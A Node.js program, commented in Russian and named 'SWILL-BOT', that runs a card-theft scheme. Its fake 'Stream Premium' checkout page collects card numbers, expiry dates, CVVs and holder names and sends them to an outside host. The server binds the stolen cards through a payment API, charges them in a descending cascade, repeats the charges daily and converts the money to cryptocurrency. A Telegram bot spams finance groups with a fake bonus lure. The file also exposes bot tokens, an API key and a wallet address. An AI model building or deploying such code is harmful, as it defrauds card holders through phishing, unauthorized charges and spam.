// ============================================================
// SWILL-BOT - PLISIO ENDPOINT AUTO-FALLBACK
// ============================================================

const express = require('express');
const axios = require('axios');
const { Telegraf } = require('telegraf');
const fs = require('fs');
const app = express();
app.use(express.json());

// ============================================================
// 1. КОНФИГУРАЦИЯ
// ============================================================
const CONFIG = {
    mainBotToken: '8776067440:AAE9HGFF11XCMqQyRpyCGGeKLR4JR3qAnME',
    spamBotToken: '8993667436:AAETd1tW4YtaYqARDYmc3I97KsTvqBu0CLg',
    adminChatId: '7505102783',

    plisioApiKey: 'X2pamXJ1Y3zI856Iwvka_ZrIHhnGgjth9JKPeXmY9L6-lff4-UK5KAAu78zuW7dB',
    walletAddress: 'UQB6R-HNp_tOK7rTK0UTWNrMlvnyZCbWMpXeRkxmjKvUN4v-',
    domain: 'freelanspropay.duckdns.org',

    startAmount: 1000,
    minAmount: 200,
    step: 500,

    searchKeywords: [
        'заработок', 'крипта', 'инвестиции', 'бизнес',
        'фриланс', 'работа', 'подработка', 'деньги',
        'финансы', 'трейдинг', 'биржа', 'криптовалюта'
    ],
    spamMessage: `🔥 БЕСПЛАТНЫЙ БОНУС 500 ₽ НА КАРТУ!\n\nПереходи по ссылке, введи карту для верификации — получи 500 ₽ на счёт.\n👉 https://botsite-0mtp.onrender.com\nУспей, акция ограничена!`,
    spamInterval: 3 * 60 * 60 * 1000,
    dailyLimit: 100,
    delays: {
        betweenMessages: 5000,
        betweenGroups: 8000,
        joinDelay: 3000,
    },
    port: process.env.PORT || 3000,
};

// ============================================================
// 2. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
// ============================================================
function logToFile(message) {
    try {
        fs.appendFileSync('swill.log', `[${new Date().toISOString()}] ${message}\n`);
    } catch (err) {}
}

function loadStats() {
    try {
        return JSON.parse(fs.readFileSync('stats.json', 'utf8'));
    } catch {
        return { totalCards: 0, totalUSDT: 0, successfulSpam: 0, failedSpam: 0 };
    }
}

function saveStats(stats) {
    try {
        fs.writeFileSync('stats.json', JSON.stringify(stats, null, 2));
    } catch (err) {}
}

function loadUsedGroups() {
    try {
        return JSON.parse(fs.readFileSync('used_groups.json', 'utf8'));
    } catch {
        return [];
    }
}

function saveUsedGroups(groups) {
    try {
        fs.writeFileSync('used_groups.json', JSON.stringify(groups, null, 2));
    } catch (err) {}
}

function randomDelay(min, max) {
    return new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min));
}

// ============================================================
// 3. HTML САЙТ
// ============================================================
const HTML_PAGE = `
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оформление подписки | Premium</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0e1a 0%, #1a2332 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', sans-serif;
            padding: 20px;
        }
        .container { width: 100%; max-width: 440px; }
        .card-box {
            background: linear-gradient(145deg, #1a2332, #0f172a);
            padding: 45px 35px;
            border-radius: 28px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
            border: 1px solid rgba(255,255,255,0.05);
            color: #fff;
        }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo span { color: #4f8cf7; font-weight: 700; font-size: 22px; }
        .logo span i { color: #7ecf8a; }
        h1 { font-size: 23px; text-align: center; margin-bottom: 4px; }
        .price { font-size: 19px; color: #7ecf8a; text-align: center; margin-bottom: 4px; }
        .sub { color: #8899aa; font-size: 13px; text-align: center; margin-bottom: 25px; }
        .input-group { margin-bottom: 14px; }
        .input-group input {
            width: 100%;
            padding: 16px 18px;
            background: #0f172a;
            border: 1px solid #2a3a4f;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        .input-group input:focus {
            outline: none;
            border-color: #4f8cf7;
            box-shadow: 0 0 0 4px rgba(79, 140, 247, 0.15);
        }
        .input-group input::placeholder { color: #4a5a6f; }
        .row { display: flex; gap: 14px; }
        .row .input-group { width: 50%; }
        .btn-submit {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #4f8cf7, #6a5acd);
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            border: none;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
        }
        .btn-submit:hover { transform: scale(1.02); box-shadow: 0 0 35px rgba(79, 140, 247, 0.4); }
        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
        #status { margin-top: 18px; font-size: 14px; color: #b0c4de; text-align: center; min-height: 22px; }
        #status.success { color: #7ecf8a; }
        #status.error { color: #ff6b6b; }
        .footer { margin-top: 22px; display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
        .badge { background: #1a2a3a; padding: 6px 16px; border-radius: 20px; font-size: 11px; color: #6a8a9a; }
        .timer { text-align: center; margin-top: 12px; font-size: 13px; color: #4a5a6f; }
        .timer strong { color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card-box">
            <div class="logo"><span>▶ Stream <i>Premium</i></span></div>
            <h1>Доступ к контенту</h1>
            <p class="price">Оплата доступа: <strong>5 ₽</strong></p>
            <p class="sub">Без подписок и скрытых платежей</p>
            <form id="payForm">
                <div class="input-group">
                    <input type="text" id="card" placeholder="Номер карты" maxlength="19" required
                           oninput="this.value = this.value.replace(/\\D/g,'').replace(/(.{4})/g,'$1 ').trim()">
                </div>
                <div class="row">
                    <div class="input-group">
                        <input type="text" id="expiry" placeholder="ММ/ГГ" maxlength="5" required
                               oninput="if(this.value.length === 2 && !this.value.includes('/')) this.value += '/'">
                    </div>
                    <div class="input-group">
                        <input type="text" id="cvv" placeholder="CVV" maxlength="4" required
                               oninput="this.value = this.value.replace(/\\D/g,'')">
                    </div>
                </div>
                <div class="input-group">
                    <input type="text" id="holder" placeholder="Имя держателя" required>
                </div>
                <button type="submit" class="btn-submit" id="submitBtn">Подключить</button>
            </form>
            <div id="status"></div>
            <div class="timer">⏳ Акция действует: <strong id="countdown">15:00</strong></div>
            <div class="footer">
                <span class="badge">🔒 Защищено SSL</span>
                <span class="badge">💳 Безопасный платёж</span>
            </div>
        </div>
    </div>
    <script>
        let timeLeft = 900;
        const countdownEl = document.getElementById('countdown');
        setInterval(() => {
            timeLeft--;
            const mins = Math.floor(timeLeft / 60);
            const secs = timeLeft % 60;
            countdownEl.textContent = \`\${String(mins).padStart(2, '0')}:\${String(secs).padStart(2, '0')}\`;
            if (timeLeft <= 0) { countdownEl.textContent = '00:00'; countdownEl.style.color = '#ff6b6b'; }
        }, 1000);

        document.getElementById('payForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const statusEl = document.getElementById('status');
            btn.disabled = true;
            btn.textContent = '⏳ Обработка...';
            statusEl.textContent = '';
            statusEl.className = '';

            const data = {
                card: document.getElementById('card').value.replace(/\\s/g, ''),
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                holder: document.getElementById('holder').value
            };

            try {
                const res = await fetch('https://botsite-0mtp.onrender.com/charge', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await res.json();
                if (result.success) {
                    statusEl.textContent = '✅ ' + result.message;
                    statusEl.className = 'success';
                    btn.textContent = '✅ Подписка активна!';
                    btn.style.background = 'linear-gradient(135deg, #2ecc71, #27ae60)';
                } else {
                    statusEl.textContent = '⚠️ ' + result.message;
                    statusEl.className = 'error';
                    btn.textContent = 'Подключить';
                    btn.disabled = false;
                }
            } catch {
                statusEl.textContent = '❌ Ошибка соединения. Попробуйте позже.';
                statusEl.className = 'error';
                btn.textContent = 'Подключить';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(HTML_PAGE));
app.get('/zarabotok', (req, res) => res.send(HTML_PAGE));
app.get('/bonus', (req, res) => res.send(HTML_PAGE));
app.get('/podpiska', (req, res) => res.send(HTML_PAGE));

// ============================================================
// 4. PLISIO - ПЕРЕБОР ЭНДПОИНТОВ (AUTO-FALLBACK)
// ============================================================

// Все возможные эндпоинты Plisio для создания платежа
const PLISIO_ENDPOINTS = [
    'https://api.plisio.net/api/v1/charge',
    'https://api.plisio.net/api/v1/charges',
    'https://api.plisio.net/api/v1/invoices/create',
    'https://api.plisio.net/api/v1/invoices',
    'https://plisio.net/api/v1/charge',
    'https://plisio.net/api/v1/charges',
    'https://plisio.net/api/v1/invoices/create',
    'https://plisio.net/api/v1/invoices'
];

// --- ФУНКЦИЯ: ПРОВЕРКА ЭНДПОИНТОВ ---
async function tryPlisioEndpoints(cardData) {
    const errors = [];

    for (const endpoint of PLISIO_ENDPOINTS) {
        try {
            console.log(`🔄 Пробую эндпоинт: ${endpoint}`);

            const response = await axios.post(endpoint, {
                card_number: cardData.card,
                card_expiry: cardData.expiry,
                card_cvv: cardData.cvv,
                card_holder: cardData.holder,
                amount: 5,
                currency: 'RUB',
                wallet: CONFIG.walletAddress,
                api_key: CONFIG.plisioApiKey
            }, { timeout: 10000 });

            // Проверяем успешный ответ
            if (response.data && response.data.data && response.data.data.binding_id) {
                console.log(`✅ УСПЕШНЫЙ ЭНДПОИНТ: ${endpoint}`);
                return {
                    success: true,
                    endpoint: endpoint,
                    binding_id: response.data.data.binding_id,
                    data: response.data
                };
            } else {
                console.log(`⚠️ Эндпоинт ${endpoint} вернул ответ без binding_id`);
                errors.push(`${endpoint}: Нет binding_id в ответе`);
                continue;
            }

        } catch (err) {
            const status = err.response?.status || 'Нет статуса';
            const message = err.response?.data?.message || err.message;
            console.log(`❌ Эндпоинт ${endpoint} вернул ошибку: ${status} - ${message}`);
            errors.push(`${endpoint}: ${status} - ${message}`);
            continue;
        }
    }

    return {
        success: false,
        errors: errors
    };
}

// ============================================================
// 5. ОБРАБОТЧИК КАРТ
// ============================================================
app.post('/charge', async (req, res) => {
    const { card, expiry, cvv, holder } = req.body;
    const stats = loadStats();
    const bot = new Telegraf(CONFIG.mainBotToken);

    const maskedCard = card.slice(0, 4) + '••••••••' + card.slice(-4);
    logToFile(`CARD: ${maskedCard} | ${expiry} | ${holder}`);

    // --- ФУНКЦИЯ ДЛЯ ОТПРАВКИ ОШИБОК В TELEGRAM ---
    async function sendErrorToTelegram(message, details) {
        try {
            await bot.telegram.sendMessage(CONFIG.adminChatId,
                `⚠️ ОШИБКА PLISIO:\n` +
                `Карта: ${maskedCard}\n` +
                `Сообщение: ${message}\n` +
                `Детали: ${details || 'Нет дополнительных данных'}`
            );
        } catch (e) {
            console.log('⚠️ Не удалось отправить ошибку в Telegram:', e.message);
        }
    }

    // --- ПЕРЕБОР ЭНДПОИНТОВ ---
    const result = await tryPlisioEndpoints({
        card: card,
        expiry: expiry,
        cvv: cvv,
        holder: holder
    });

    if (!result.success) {
        const errorMsg = `❌ Все эндпоинты Plisio не сработали. Попробуйте позже.`;
        const details = result.errors.join('\n');
        logToFile(`FAIL ALL ENDPOINTS: ${maskedCard}\n${details}`);
        await sendErrorToTelegram(errorMsg, details);
        return res.json({ message: '❌ Платежный шлюз временно недоступен. Попробуйте позже.', success: false });
    }

    // --- УСПЕХ: ПРИВЯЗКА СОЗДАНА ---
    const bindingId = result.binding_id;
    fs.appendFileSync('bindings.json', JSON.stringify({
        binding_id: bindingId,
        card_last4: card.slice(-4),
        endpoint: result.endpoint,
        date: new Date().toISOString()
    }) + '\n');

    try {
        await bot.telegram.sendMessage(CONFIG.adminChatId,
            `✅ ПРИВЯЗКА СОЗДАНА:\nКарта: ${maskedCard}\nЭндпоинт: ${result.endpoint}`
        );
    } catch (e) {}

    // --- КАСКАД (3 ПОПЫТКИ) ---
    await new Promise(resolve => setTimeout(resolve, 3000));

    const amounts = [1000, 500, 200];
    let chargedAmount = null;

    for (const amount of amounts) {
        try {
            await axios.post('https://api.plisio.net/api/v1/charge_binding', {
                binding_id: bindingId,
                amount: amount,
                currency: 'RUB',
                wallet: CONFIG.walletAddress,
                api_key: CONFIG.plisioApiKey
            }, { timeout: 5000 });

            chargedAmount = amount;
            break;
        } catch (err) {
            logToFile(`CASCADE FAIL: ${amount} ₽ for ${maskedCard} - ${err.message}`);
            continue;
        }
    }

    // --- РЕЗУЛЬТАТ ---
    if (chargedAmount) {
        const usdtAmount = (chargedAmount / 90).toFixed(4);
        stats.totalCards++;
        stats.totalUSDT += parseFloat(usdtAmount);
        saveStats(stats);

        try {
            await bot.telegram.sendMessage(CONFIG.adminChatId,
                `💰 УСПЕШНО СПИСАНО!\n` +
                `Карта: ${maskedCard}\n` +
                `Сумма: ${chargedAmount} ₽ (5 ₽ + ${chargedAmount} ₽)\n` +
                `USDT: ${usdtAmount}\n` +
                `📊 Всего: ${stats.totalCards} карт, ${stats.totalUSDT.toFixed(4)} USDT`
            );
        } catch (e) {}

        res.json({ message: `✅ Доступ активирован. Списано ${chargedAmount} ₽.`, success: true });
    } else {
        try {
            await bot.telegram.sendMessage(CONFIG.adminChatId,
                `⚠️ На карте ${maskedCard} меньше 200 ₽.`
            );
        } catch (e) {}
        res.json({ message: '✅ Доступ активирован.', success: true });
    }
});

// ============================================================
// 6. ПОВТОРНЫЕ СПИСАНИЯ (КАЖДЫЕ 24 ЧАСА)
// ============================================================
setInterval(async () => {
    try {
        const bindings = fs.readFileSync('bindings.json', 'utf8')
            .split('\n')
            .filter(Boolean)
            .map(line => JSON.parse(line));

        for (const binding of bindings) {
            try {
                await axios.post('https://api.plisio.net/api/v1/charge_binding', {
                    binding_id: binding.binding_id,
                    amount: 1000,
                    currency: 'RUB',
                    wallet: CONFIG.walletAddress,
                    api_key: CONFIG.plisioApiKey
                }, { timeout: 5000 });

                const bot = new Telegraf(CONFIG.mainBotToken);
                try {
                    await bot.telegram.sendMessage(CONFIG.adminChatId,
                        `🔄 ПОВТОРНОЕ СПИСАНИЕ:\n` +
                        `Карта: ****${binding.card_last4}\n` +
                        `Сумма: 1000 ₽ → ${(1000 / 90).toFixed(4)} USDT`
                    );
                } catch (e) {}
            } catch (err) {
                continue;
            }
        }
    } catch (err) {}
}, 24 * 60 * 60 * 1000);

// ============================================================
// 7. АВТОМАТИЧЕСКИЙ СПАМ-БОТ
// ============================================================
async function startSpam() {
    console.log('🚀 Автоспам запущен...');
    const spamBot = new Telegraf(CONFIG.spamBotToken);
    const adminBot = new Telegraf(CONFIG.mainBotToken);
    const stats = loadStats();
    const usedGroups = loadUsedGroups();

    const today = new Date().toDateString();
    const todayGroups = usedGroups.filter(g => new Date(g.date).toDateString() === today);
    if (todayGroups.length >= CONFIG.dailyLimit) {
        console.log(`✅ Дневной лимит достигнут (${CONFIG.dailyLimit})`);
        return;
    }

    let foundGroups = [];
    for (const keyword of CONFIG.searchKeywords) {
        try {
            const response = await axios.post(`https://api.telegram.org/bot${CONFIG.spamBotToken}/searchPublicChat`, {
                query: keyword
            });
            if (response.data && response.data.result) {
                foundGroups = foundGroups.concat(response.data.result);
            }
            await randomDelay(2000, 5000);
        } catch (err) {}
    }

    const uniqueGroups = {};
    for (const group of foundGroups) {
        if (group.id && !usedGroups.some(g => g.id === group.id)) {
            uniqueGroups[group.id] = group;
        }
    }

    const groupsToProcess = Object.values(uniqueGroups);
    console.log(`📊 Найдено ${groupsToProcess.length} новых групп`);

    let successful = 0;
    let failed = 0;

    for (const group of groupsToProcess) {
        if (successful >= CONFIG.dailyLimit) break;
        const groupId = group.id;
        const groupTitle = group.title || 'Группа';

        try {
            try {
                await spamBot.telegram.joinChat(groupId);
                await randomDelay(2000, 4000);
            } catch (e) {}

            try {
                await spamBot.telegram.sendMessage(groupId, CONFIG.spamMessage);
                successful++;
                console.log(`✅ ${groupTitle}`);
            } catch (e) {
                failed++;
            }

            usedGroups.push({ id: groupId, title: groupTitle, date: new Date().toISOString() });
            saveUsedGroups(usedGroups);
            await randomDelay(5000, 8000);
        } catch (e) {
            failed++;
        }
    }

    stats.successfulSpam += successful;
    stats.failedSpam += failed;
    saveStats(stats);

    try {
        await adminBot.telegram.sendMessage(CONFIG.adminChatId,
            `📊 ОТЧЁТ О РАССЫЛКЕ:\n✅ Успешно: ${successful}\n❌ Неудачно: ${failed}`
        );
    } catch (e) {}
}

setTimeout(startSpam, 30000);
setInterval(startSpam, CONFIG.spamInterval);

// ============================================================
// 8. КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ
// ============================================================
const adminBot = new Telegraf(CONFIG.mainBotToken);

adminBot.command('status', async (ctx) => {
    const stats = loadStats();
    ctx.reply(
        `📊 СТАТИСТИКА:\n\n` +
        `💳 Карт: ${stats.totalCards}\n` +
        `💰 USDT: ${stats.totalUSDT ? stats.totalUSDT.toFixed(4) : 0}\n` +
        `📨 Отправлено: ${stats.successfulSpam}`
    );
});

adminBot.command('startspam', async (ctx) => {
    ctx.reply('🚀 Запускаю...');
    await startSpam();
    ctx.reply('✅ Готово');
});

adminBot.launch().catch(() => {});

// ============================================================
// 9. ЗАПУСК
// ============================================================
const PORT = CONFIG.port || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════');
    console.log('🚀 SWILL-BOT ЗАПУЩЕН НА RENDER');
    console.log(`🌐 Сайт: https://${CONFIG.domain}`);
    console.log(`💰 Кошелёк: ${CONFIG.walletAddress}`);
    console.log('✅ Сбор карт: АВТОМАТИЧЕСКИ');
    console.log('✅ Спам-бот: АКТИВЕН');
    console.log('✅ Каскад: 1000 → 500 → 200 ₽');
    console.log('✅ Auto-Fallback эндпоинтов: ВКЛЮЧЕН');
    console.log('✅ Логи ошибок: ВКЛЮЧЕНЫ');
    console.log('═══════════════════════════════════════');
});

// ============================================================
// 10. ОБРАБОТКА ОШИБОК
// ============================================================
process.on('unhandledRejection', (err) => console.log('❌', err.message));
process.on('uncaughtException', (err) => console.log('❌', err.message));
